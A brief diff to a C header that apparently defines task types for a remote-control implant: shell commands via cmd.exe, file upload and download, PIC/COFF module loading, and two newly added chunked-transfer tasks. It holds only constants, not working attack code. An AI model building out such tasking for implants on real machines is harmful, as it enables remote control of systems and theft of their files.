@@ -24,6 +24,8 @@
 #define TASK_TYPE_CMD        5   /* Shell command via cmd.exe           */
 #define TASK_TYPE_UPLOAD     6   /* Upload file bytes to remote path    */
 #define TASK_TYPE_DOWNLOAD   7   /* Download remote file bytes          */
+#define TASK_TYPE_UPLOAD_CHUNK   8  /* Upload file bytes at an offset    */
+#define TASK_TYPE_DOWNLOAD_CHUNK 9  /* Download file bytes from an offset */
 
 /* Module bus tasks */
 #define TASK_TYPE_MODULE     10  /* PIC/COFF module via bus             */
